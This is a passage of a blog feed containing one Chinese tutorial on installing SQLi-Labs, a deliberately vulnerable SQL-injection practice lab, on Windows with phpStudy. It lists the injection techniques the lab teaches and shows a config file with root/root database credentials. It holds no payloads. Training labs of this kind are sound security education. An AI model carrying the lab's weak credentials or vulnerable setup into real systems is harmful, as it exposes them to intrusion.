        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>windows本地靶场--Sqli-Labs(环境搭建)</title>
    <link href="http://www.fangmingxuan.com/2020/05/Sqli-Labs(%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)/"/>
    <id>http://www.fangmingxuan.com/2020/05/Sqli-Labs(%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)/</id>
    <published>2020-05-06T05:22:23.362Z</published>
    <updated>2020-05-06T06:21:26.144Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="windows本地靶场–Sqli-Labs-环境搭建"><a href="#windows本地靶场–Sqli-Labs-环境搭建" class="headerlink" title="windows本地靶场–Sqli-Labs(环境搭建)"></a>windows本地靶场–Sqli-Labs(环境搭建)</h1>    <div id="aplayer-cqUpNBSc" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>往往很多新手在刚学习 SQL 注入的时候，都需要拥有一个能 SQL 注入的网站，需要有 <strong>SQL 注入点</strong>的。直接去互联网上找的话对新手未免有点太难了，因此：我们一般都是在本地搭建一个能 SQL 注入测试的网站，那样我们学习 SQL 注入就容易多了。</p><p>由于本地能搭建 SQL 注入的平台或程序太多了，今天我主推一个：SQLi-Labs；</p><p>下面就给大家讲一下，windows 本地如何搭建 SQL 注入测试平台 SQLi-Labs？</p><h4 id="注意：PHP-版本一定要设置成-PHP7-以下，PHP7-之后的-mysql-都改成了-mysqli-了，用-PHP7-以上版本的话会报错！"><a href="#注意：PHP-版本一定要设置成-PHP7-以下，PHP7-之后的-mysql-都改成了-mysqli-了，用-PHP7-以上版本的话会报错！" class="headerlink" title="注意：PHP 版本一定要设置成 PHP7 以下，PHP7 之后的 mysql_都改成了 mysqli_ 了，用 PHP7 以上版本的话会报错！"></a>注意：PHP 版本一定要设置成 PHP7 以下，PHP7 之后的 mysql_都改成了 mysqli_ 了，用 PHP7 以上版本的话会报错！</h4><h2 id="一、SQLi-Labs-是什么？"><a href="#一、SQLi-Labs-是什么？" class="headerlink" title="一、SQLi-Labs 是什么？"></a>一、SQLi-Labs 是什么？</h2><p>SQLi-Labs 是一个专业的 SQL 注入练习平台，适用于 GET 和 POST 场景，包含了以下注入：</p><p><strong>1、基于错误的注入（Union Select）</strong></p><p>字符串</p><p>整数</p><p><strong>2、基于误差的注入（双查询注入）</strong></p><p><strong>3、盲注入（01、基于 Boolian 数据类型注入， 02、基于时间注入）</strong></p><p><strong>4、更新查询注入（update ）</strong></p><p><strong>5、插入查询注入（insert ）</strong></p><p><strong>6、Header 头部注入（01、基于 Referer 注入， 02、基于 UserAgent 注入，03、基于 cookie 注入）</strong></p><p><strong>7、二阶注入，也可叫二次注入</strong></p><p><strong>8、绕过 WAF</strong></p><p>绕过黑名单 \ 过滤器 \ 剥离 \ 注释剥离 OR＆AND 剥离空格和注释剥离 UNION 和 SELECT</p><p>隐瞒不匹配</p><p><strong>9、绕过 addslashes() 函数</strong></p><p><strong>10、绕过 mysql_real_escape_string() 函数（在特殊条件下）</strong></p><p><strong>11、堆叠注入（堆查询注入）</strong></p><p><strong>12、二级通道提取</strong></p><h2 id="二、SQLi-Labs-下载"><a href="#二、SQLi-Labs-下载" class="headerlink" title="二、SQLi-Labs 下载"></a>二、SQLi-Labs 下载</h2><p>下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><h2 id="三、SQLi-Labs-安装"><a href="#三、SQLi-Labs-安装" class="headerlink" title="三、SQLi-Labs 安装"></a>三、SQLi-Labs 安装</h2><p>在安装前，需要做一个准备工作，我们先去做一个 PHP+Mysql 的环境搭建。</p><p><strong>1、下载、安装、启动 phpstudy</strong>（<a href="http://www.phpstudy.net）。" target="_blank" rel="noopener">www.phpstudy.net）。</a></p><p>phpStudy 是一个 PHP 调试环境的程序集成包。恰好我们可以用到 “PHP+Mysql+Apache”。</p><p><strong>2、将下载的 SQLi-Labs.zip 解压到 phpstudy 网站根目录下。</strong></p><p>例如：我这解压后的路径是 “F:\phpStudy\WWW\sqli-labs”。</p><p><strong>3、修改 db-creds.inc 里代码</strong>如下：</p><p>例如：我的配置文件路径是 “F:\phpStudy\WWW\sqli-labs\sql-connections”。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$dbuser &#x3D;&#39;root&#39;;</span><br><span class="line">$dbpass &#x3D;&#39;root&#39;;</span><br><span class="line">$dbname &#x3D;&quot;security&quot;;</span><br><span class="line">$host &#x3D; &#39;localhost&#39;;</span><br><span class="line">$dbname1 &#x3D; &quot;challenges&quot;;</span><br></pre></td></tr></table></figure><p>因为 phpstudy 默认的 mysql 数据库地址是 “127.0.0.1 或 localhost”，用户名和密码都是”root”。主要是修改’$dbpass‘为 root，这里很重要，修改后自然是需要保存文件的，这个不用说相信大家也能知道。</p><p>4、浏览器打开 “<strong><a href="http://127.0.0.1/sqli-labs/" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/</a></strong>” 访问首页，并点击 “<strong>Setup/reset Database</strong>” 以创建数据库，创建表并填充数据。</p><p><a href="https://www.fujieace.com/wp-content/uploads/2019/04/159.png?x83086" target="_blank" rel="noopener"><img src="/" class="lazyload" data-src="http://qiniuph.fangmingxuan.com/img/159.png"  alt="img"></a></p><p><a href="https://www.fujieace.com/wp-content/uploads/2019/04/258.png?x83086" target="_blank" rel="noopener"><img src="/" class="lazyload" data-src="http://qiniuph.fangmingxuan.com/img/258.png"  alt="img"></a></p><p>5、现在浏览器打开 “<a href="http://127.0.0.1/sqli-labs/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/&quot;</a> 向下翻，就可以看到有很多不同的注入点了，分为基本 SQL 注入、高级 SQL 注入、SQL 堆叠注入、挑战四个部份，总共约 75 个 SQL 注入漏洞。</p><p><a href="https://www.fujieace.com/wp-content/uploads/2019/04/456-2.png?x83086" target="_blank" rel="noopener"><img src="/" class="lazyload" data-src="http://qiniuph.fangmingxuan.com/img/456-2.png"  alt="img"></a></p><p>总结：虽然说 SQL 注入搭建平台很多，程序也很多，但是很多的漏洞测试平台都不专一，大多数平台漏洞包含是比较全面的。</p><p>sqli-labs 它是只专注 SQL 注入漏洞的，如果你只想主攻这个 SQL 注入方向，此平台真的是非常的给力。据统计，互联网上 SQL 注入漏洞占整体的百分之六十左右。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
</feed>
